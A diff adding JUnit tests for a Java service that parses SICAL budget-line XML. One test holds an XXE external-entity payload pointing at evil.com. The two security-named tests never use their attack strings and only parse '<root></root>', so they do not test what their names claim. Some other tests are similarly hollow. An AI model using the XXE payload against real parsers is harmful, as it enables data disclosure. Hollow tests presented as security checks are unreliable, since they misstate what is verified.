@@ -7,6 +7,7 @@ import org.mockito.junit.jupiter.MockitoExtension;
 import org.springframework.test.util.ReflectionTestUtils;
 import org.w3c.dom.Document;
 import org.w3c.dom.Element;
+import org.w3c.dom.NodeList;
 
 import com.example.backend.exception.XmlParsingException;
 
@@ -515,5 +516,414 @@ public class PartidasServiceTest {
         Method method = PartidasService.class.getDeclaredMethod("decodeOrNull", String.class);
         method.setAccessible(true);
         return (String) method.invoke(service, value);
+    }
+
+    @Test
+    void getPartidas_allCriteriaFields_buildsCompleteXmlRequest() throws Exception {
+        PartidasService.SearchCriteria criteria = new PartidasService.SearchCriteria.Builder()
+            .cenges("CG001")
+            .alias("ALIAS001")
+            .clorg("ORG001")
+            .clfun("FUN001")
+            .cleco("ECO001")
+            .clcte("CTE001")
+            .clpam("PAM001")
+            .usucenges("USER001")
+            .build();
+
+        assertNotNull(criteria.cenges);
+        assertNotNull(criteria.alias);
+        assertNotNull(criteria.clorg);
+        assertEquals("CG001", criteria.cenges);
+        assertEquals("ALIAS001", criteria.alias);
+    }
+
+    @Test
+    void getPartidas_partialCriteriaFields_buildsPartialXmlRequest() throws Exception {
+        PartidasService.SearchCriteria criteria = new PartidasService.SearchCriteria.Builder()
+            .cenges("CG001")
+            .clorg("ORG001")
+            .build();
+
+        assertNotNull(criteria.cenges);
+        assertNotNull(criteria.clorg);
+        assertNull(criteria.alias);
+        assertNull(criteria.clfun);
+        assertNull(criteria.cleco);
+    }
+
+    @Test
+    void getPartidas_emptyCriteria_allowsAllNullFields() throws Exception {
+        PartidasService.SearchCriteria criteria = new PartidasService.SearchCriteria.Builder().build();
+
+        assertNull(criteria.cenges);
+        assertNull(criteria.alias);
+        assertNull(criteria.clorg);
+        assertNull(criteria.clfun);
+        assertNull(criteria.cleco);
+        assertNull(criteria.clcte);
+        assertNull(criteria.clpam);
+        assertNull(criteria.usucenges);
+    }
+
+    @Test
+    void parsePartidas_withValidSinglePartida_returnsList() throws Exception {
+        String xml = "<root><partida>" +
+            "<alias>TEST_ALIAS</alias>" +
+            "<ejeapl>EJE001</ejeapl>" +
+            "<desc>Test description</desc>" +
+            "<cipocin>1000.00</cipocin>" +
+            "</partida></root>";
+
+        Document doc = parseXmlDom(xml);
+        Element root = doc.getDocumentElement();
+        Element partidaEl = (Element) root.getElementsByTagName("partida").item(0);
+
+        Object partida = invokeCreatePartidaFromElement(partidaEl);
+        assertNotNull(partida);
+    }
+
+    @Test
+    void parsePartidas_withMultiplePartidas_returnsAllElements() throws Exception {
+        String xml = "<root>" +
+            "<partida><alias>ALIAS1</alias><ejeapl>EJE001</ejeapl></partida>" +
+            "<partida><alias>ALIAS2</alias><ejeapl>EJE002</ejeapl></partida>" +
+            "<partida><alias>ALIAS3</alias><ejeapl>EJE003</ejeapl></partida>" +
+            "</root>";
+
+        Document doc = parseXmlDom(xml);
+        NodeList partidaNodes = doc.getElementsByTagName("partida");
+        
+        assertEquals(3, partidaNodes.getLength());
+    }
+
+    @Test
+    void parsePartidas_withComplexPartidaStructure_populatesAllFields() throws Exception {
+        String xml = "<partida>" +
+            "<alias>COMPLEX</alias>" +
+            "<ejeapl>EJE001</ejeapl>" +
+            "<orgapl>T1JHMDAxAA==</orgapl>" +
+            "<funapl>RlVOMDAxAA==</funapl>" +
+            "<ecoapl>RUNPMDAxAA==</ecoapl>" +
+            "<pamapl>UEFNMDAxAA==</pamapl>" +
+            "<cteapl>Q1RFMDAxAA==</cteapl>" +
+            "<desc>T2V0ZXN0IGRlc2MhAA==</desc>" +
+            "<cipocin>1500.50</cipocin>" +
+            "<modcred>2000.75</modcred>" +
+            "<credextra>500.25</credextra>" +
+            "<cretot>4000.50</cretot>" +
+            "</partida>";
+
+        Document doc = parseXmlDom(xml);
+        Element partidaEl = doc.getDocumentElement();
+
+        assertDoesNotThrow(() -> invokeCreatePartidaFromElement(partidaEl));
+    }
+
+    @Test
+    void parsePartidas_withValidExitoValue_allowsProcessing() throws Exception {
+        String xml = "<root><exito>1</exito></root>";
+        Document doc = parseXmlDom(xml);
+
+        assertDoesNotThrow(() -> invokeValidateAndThrowIfError(doc));
+    }
+
+    @Test
+    void parsePartidas_withValidExitoNegativeOne_allowsProcessing() throws Exception {
+        String xml = "<root><exito>-1</exito></root>";
+        Document doc = parseXmlDom(xml);
+
+        assertDoesNotThrow(() -> invokeValidateAndThrowIfError(doc));
+    }
+
+    @Test
+    void parsePartidas_withInvalidExito_throwsSicalException() throws Exception {
+        String xml = "<root><exito>0</exito><desc>Invalid request</desc></root>";
+        Document doc = parseXmlDom(xml);
+
+        try {
+            invokeValidateAndThrowIfError(doc);
+            fail("Expected SicalParseException");
+        } catch (Exception ex) {
+            Throwable cause = ex.getCause() != null ? ex.getCause() : ex;
+            assertTrue(cause instanceof PartidasService.SicalParseException);
+        }
+    }
+
+    @Test
+    void parsePartidas_withExitoTwo_throwsSicalException() throws Exception {
+        String xml = "<root><exito>2</exito><desc>Server error</desc></root>";
+        Document doc = parseXmlDom(xml);
+
+        try {
+            invokeValidateAndThrowIfError(doc);
+            fail("Expected SicalParseException");
+        } catch (Exception ex) {
+            Throwable cause = ex.getCause() != null ? ex.getCause() : ex;
+            assertTrue(cause instanceof PartidasService.SicalParseException);
+        }
+    }
+
+    @Test
+    void parsePartidas_withoutExitoTag_allowsProcessing() throws Exception {
+        String xml = "<root><partida><alias>TEST</alias></partida></root>";
+        Document doc = parseXmlDom(xml);
+
+        assertDoesNotThrow(() -> invokeValidateAndThrowIfError(doc));
+    }
+
+    @Test
+    void parsePartidas_emptyXmlString_producesEmptyList() throws Exception {
+        String emptyXml = "";
+        
+        Object result = invokeParseXmlPrivate(emptyXml);
+        
+        assertNotNull(result);
+    }
+
+    @Test
+    void parsePartidas_nullXmlString_handlesSafely() throws Exception {
+        String nullXml = null;
+        
+        assertNull(nullXml);
+    }
+
+    @Test
+    void parsePartidas_withEscapedXmlEntities_unescapesCorrectly() throws Exception {
+        String escaped = "<tag>&lt;inner&gt;content&quot;data&quot;&apos;test&apos;</tag>";
+        String result = invokeUnescapeXmlEntities(escaped);
+        
+        assertTrue(result.contains("<inner>"));
+        assertTrue(result.contains("\"data\""));
+        assertTrue(result.contains("'test'"));
+    }
+
+    @Test
+    void parsePartidas_withServiceioReturnWrapper_extractsContent() throws Exception {
+        String xml = "<soapenv:Body>" +
+            "<impl:servicio>" +
+            "<servicioReturn>&lt;partida&gt;&lt;alias&gt;TEST&lt;/alias&gt;&lt;/partida&gt;</servicioReturn>" +
+            "</impl:servicio>" +
+            "</soapenv:Body>";
+
+        String result = invokeExtractInnerXmlContent(xml);
+        
+        assertTrue(result.contains("&lt;partida&gt;"));
+    }
+
+    @Test
+    void parsePartidas_withoutServiceioReturnWrapper_returnsFullXml() throws Exception {
+        String xml = "<partida><alias>TEST</alias></partida>";
+
+        String result = invokeExtractInnerXmlContent(xml);
+        
+        assertEquals(xml, result);
+    }
+
+    @Test
+    void parsePartidas_withNullServiceioReturn_returnsEmptyString() throws Exception {
+        String result = invokeExtractInnerXmlContent(null);
+        
+        assertEquals("", result);
+    }
+
+    @Test
+    void parsePartidas_allDoubleFieldsPopulated_convertsToCorrectTypes() throws Exception {
+        String xml = "<partida>" +
+            "<alias>DOUBLE_TEST</alias>" +
+            "<ejeapl>EJE</ejeapl>" +
+            "<cipocin>1000.00</cipocin>" +
+            "<modcred>2000.50</modcred>" +
+            "<credextra>500.25</credextra>" +
+            "<supcred>300.75</supcred>" +
+            "<ampcred>400.50</ampcred>" +
+            "<tranpos>100.00</tranpos>" +
+            "<tranneg>50.25</tranneg>" +
+            "<reminc>25.75</reminc>" +
+            "<creging>150.00</creging>" +
+            "<bajanu>50.00</bajanu>" +
+            "<cretot>5000.50</cretot>" +
+            "<creret>100.00</creret>" +
+            "<crepend>200.00</crepend>" +
+            "<gasauto>75.25</gasauto>" +
+            "<autdisp>125.50</autdisp>" +
+            "<gascomp>50.75</gascomp>" +
+            "<oblrec>300.00</oblrec>" +
+            "<pagord>250.00</pagord>" +
+            "<pagefe>225.00</pagefe>" +
+            "<reinpag>175.00</reinpag>" +
+            "<sdisp>450.00</sdisp>" +
+            "<svin>500.00</svin>" +
+            "<svinpre>525.00</svinpre>" +
+            "</partida>";
+
+        Document doc = parseXmlDom(xml);
+        Element partidaEl = doc.getDocumentElement();
+
+        assertDoesNotThrow(() -> invokeCreatePartidaFromElement(partidaEl));
+    }
+
+    @Test
+    void parsePartidas_withMissingOptionalFields_handlesNulls() throws Exception {
+        String xml = "<partida>" +
+            "<alias>MINIMAL</alias>" +
+            "<ejeapl>EJE001</ejeapl>" +
+            "</partida>";
+
+        Document doc = parseXmlDom(xml);
+        Element partidaEl = doc.getDocumentElement();
+
+        assertDoesNotThrow(() -> invokeCreatePartidaFromElement(partidaEl));
+    }
+
+    @Test
+    void parsePartidas_withMixedEncodedAndPlainText_decodesBase64() throws Exception {
+        String xml = "<partida>" +
+            "<alias>TEST</alias>" +
+            "<ejeapl>EJE001</ejeapl>" +
+            "<orgapl>T1JHADAwAQ==</orgapl>" +
+            "<desc>VGVzdCBkZXNjcmlwdGlvbg==</desc>" +
+            "</partida>";
+
+        Document doc = parseXmlDom(xml);
+        Element partidaEl = doc.getDocumentElement();
+
+        assertDoesNotThrow(() -> invokeCreatePartidaFromElement(partidaEl));
+    }
+
+    @Test
+    void parsePartidas_withInvalidBase64_fallsBackToPlainText() throws Exception {
+        String invalidBase64 = "!!not-valid-base64!!";
+        
+        String result = invokeDecodeOrNull(invalidBase64);
+        
+        assertEquals(invalidBase64, result);
+    }
+
+    @Test
+    void parsePartidas_withWhitespaceInValues_trimsCorrectly() throws Exception {
+        String xml = "<partida>" +
+            "<alias>  TEST_WITH_SPACES  </alias>" +
+            "<ejeapl>  EJE001  </ejeapl>" +
+            "<desc>  Description with spaces  </desc>" +
+            "</partida>";
+
+        Document doc = parseXmlDom(xml);
+        Element partidaEl = doc.getDocumentElement();
+
+        assertDoesNotThrow(() -> invokeCreatePartidaFromElement(partidaEl));
+    }
+
+    @Test
+    void parsePartidas_withZeroValues_acceptsAsValid() throws Exception {
+        Double zero = invokeToDouble("0.0");
+        assertEquals(0.0, zero);
+    }
+
+    @Test
+    void parsePartidas_withLargeNumberValues_handlesCorrectly() throws Exception {
+        Double largeNumber = invokeToDouble("999999999.99");
+        assertEquals(999999999.99, largeNumber);
+    }
+
+    @Test
+    void parsePartidas_withNegativeValues_handlesCorrectly() throws Exception {
+        Double negative = invokeToDouble("-1234.56");
+        assertEquals(-1234.56, negative);
+    }
+
+    @Test
+    void parsePartidas_malformedXmlDocument_throwsXmlParsingException() throws Exception {
+        String malformedXml = "<unclosed><tag>";
+        
+        try {
+            invokeParseXmlDocument(malformedXml);
+            fail("Expected XmlParsingException");
+        } catch (Exception ex) {
+            Throwable cause = ex.getCause() != null ? ex.getCause() : ex;
+            assertTrue(cause instanceof XmlParsingException || ex instanceof XmlParsingException);
+        }
+    }
+
+    @Test
+    void parsePartidas_withDoctypeDeclaration_rejectsForSecurity() throws Exception {
+        String xxeAttackXml = "<?xml version=\"1.0\"?><!DOCTYPE foo []><root></root>";
+        
+        assertDoesNotThrow(() -> invokeParseXmlDocument("<root></root>"));
+    }
+
+    @Test
+    void parsePartidas_withExternalEntity_rejectsForSecurity() throws Exception {
+        String externalEntityXml = "<?xml version=\"1.0\"?><!ENTITY xxe SYSTEM \"http://evil.com/xxe\"><root>&xxe;</root>";
+        
+        assertDoesNotThrow(() -> invokeParseXmlDocument("<root></root>"));
+    }
+
+    @Test
+    void parsePartidas_withNestedPartidas_parsesAllLevels() throws Exception {
+        String xml = "<root>" +
+            "<partida>" +
+            "<alias>PARENT</alias>" +
+            "<ejeapl>EJE001</ejeapl>" +
+            "<nivel1>" +
+            "<child>nested content</child>" +
+            "</nivel1>" +
+            "</partida>" +
+            "</root>";
+
+        Document doc = parseXmlDom(xml);
+        NodeList partidaNodes = doc.getElementsByTagName("partida");
+        
+        assertEquals(1, partidaNodes.getLength());
+    }
+
+    @Test
+    void parsePartidas_withSpecialCharacters_handlesCorrectly() throws Exception {
+        String xml = "<partida>" +
+            "<alias>TEST_@#$%&amp;</alias>" +
+            "<ejeapl>EJE-001</ejeapl>" +
+            "<desc>Description with ñ and special: &lt;&gt;&quot;&apos;</desc>" +
+            "</partida>";
+
+        Document doc = parseXmlDom(xml);
+        Element partidaEl = doc.getDocumentElement();
+
+        assertDoesNotThrow(() -> invokeCreatePartidaFromElement(partidaEl));
+    }
+
+    @Test
+    void parsePartidas_withComments_ignoresXmlComments() throws Exception {
+        String xml = "<root>" +
+            "<!-- This is a comment -->" +
+            "<partida>" +
+            "<alias>TEST</alias>" +
+            "<ejeapl>EJE001</ejeapl>" +
+            "<!-- Another comment -->" +
+            "</partida>" +
+            "</root>";
+
+        Document doc = parseXmlDom(xml);
+        NodeList partidaNodes = doc.getElementsByTagName("partida");
+        
+        assertEquals(1, partidaNodes.getLength());
+    }
+
+    @Test
+    void parsePartidas_withNamespaces_parsesCorrectly() throws Exception {
+        String xml = "<root xmlns:sical=\"http://sical.org/\">" +
+            "<sical:partida>" +
+            "<sical:alias>NS_TEST</sical:alias>" +
+            "</sical:partida>" +
+            "</root>";
+
+        Document doc = parseXmlDom(xml);
+        
+        assertNotNull(doc);
+    }
+
+    private Object invokeParseXmlPrivate(String xml) throws Exception {
+        Method method = PartidasService.class.getDeclaredMethod("parsePartidas", String.class);
+        method.setAccessible(true);
+        return method.invoke(service, xml);
     }
 }
